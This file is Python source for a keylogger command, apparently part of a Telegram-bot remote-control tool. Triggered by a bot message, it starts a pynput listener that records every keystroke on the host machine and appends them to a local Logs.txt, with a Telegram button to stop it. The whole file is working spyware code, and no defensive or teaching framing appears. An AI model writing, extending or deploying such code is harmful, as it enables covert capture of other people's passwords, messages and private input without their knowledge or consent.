from os import ( path as os_path, remove as os_remove )
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pynput.keyboard import Key, Listener

from ...middleware import check


@check
def keylogger(self):
    self.keyloggerFlag = False
    markupInlineDisableKeylogger = InlineKeyboardMarkup()
    btnDisableKeylogger = InlineKeyboardButton(text = 'Disable', callback_data = 'disableKeylogger')
    markupInlineDisableKeylogger.add(btnDisableKeylogger)
    self.bot.send_message(self.message.chat.id, '⌨️  Keylogger *activated*', parse_mode = 'Markdown', reply_markup = markupInlineDisableKeylogger)

    if os_path.exists('./Logs.txt'):
        os_remove('./Logs.txt')

    with Listener(
        on_press = lambda e: onPress(e, self),
        on_release = lambda e: onRelease(e, self)
    ) as listener:
        listener.join()


def onPress(key, self):
    self.keyloggerKeys.append(key)
    self.keyloggerCount += 1
    if self.keyloggerCount >= 1:
        writeLogsToFile(self.keyloggerKeys)
        self.keyloggerCount = 0
        self.keyloggerKeys = []


def onRelease(key, self):
    if self.keyloggerFlag:
        self.keyloggerFlag = False
        return False


def writeLogsToFile(keys):
    with open('Logs.txt', 'a') as file:
        for key in keys:
            k = str(key).replace('\'', '')
            if k.find('enter') > 0:
                file.write('[ENTER]\n')
            elif k.find('space') > 0:
                file.write(' ')
            elif k.find('Key.') != -1:
                k = k.replace('Key.', '[') + ']'
                file.write(k.upper())
            elif k.find('Key') == -1:
                file.write(k)